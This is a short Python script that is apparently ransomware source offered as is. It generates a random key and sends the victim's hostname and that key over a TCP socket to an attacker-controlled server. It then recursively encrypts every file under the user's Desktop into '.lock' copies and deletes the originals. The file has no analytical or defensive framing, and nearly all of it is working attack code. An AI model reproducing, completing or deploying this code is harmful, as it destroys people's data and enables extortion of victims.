import pyAesCrypt
import socket
import os
import glob
import random

# Encryption information
ENCRYPTION_LEVEL = 512 // 8
KEY_CHAR_POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ<>?,./:"|;{}\[]'
BUFFER_SIZE = 64 * 1024

def generate_key():
    key = ''
    for i in range(ENCRYPTION_LEVEL):
        key += KEY_CHAR_POOL[random.randint(0, len(KEY_CHAR_POOL)-1)]
    return key

def connect_and_send_data_to_server(ip_address, port, hostname ,key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((ip_address, port))
        print("Successfully connected... transmitting hostname and key")
        s.send(f'{hostname} : {key}'.encode('utf-8'))
        print('Finished transmitting data!')
        s.close()

def encrypt(key):
    current_dir = os.environ['USERPROFILE']
    print(current_dir)
    print('Beginning recursvie encryption...')
    for x in glob.glob('Desktop\\**\*', recursive=True):
        full_path = os.path.join(current_dir, x)
        full_new_file = os.path.join(current_dir, x + '.lock')
        if os.path.isfile(full_path):
            print('>>> Original:\t'+full_path+'')
            print('>>> Encrypted:\t'+full_new_file+'\n')
            pyAesCrypt.encryptFile(full_path, full_new_file, key, BUFFER_SIZE)
            os.remove(full_path)

if __name__ == '__main__':
    print('Generating encryption key')
    key = generate_key()
    # Grab client hostname
    hostname = os.getenv('COMPUTERNAME')
    connect_and_send_data_to_server(IP_ADDRESS, PORT, hostname, key)
    encrypt(key)
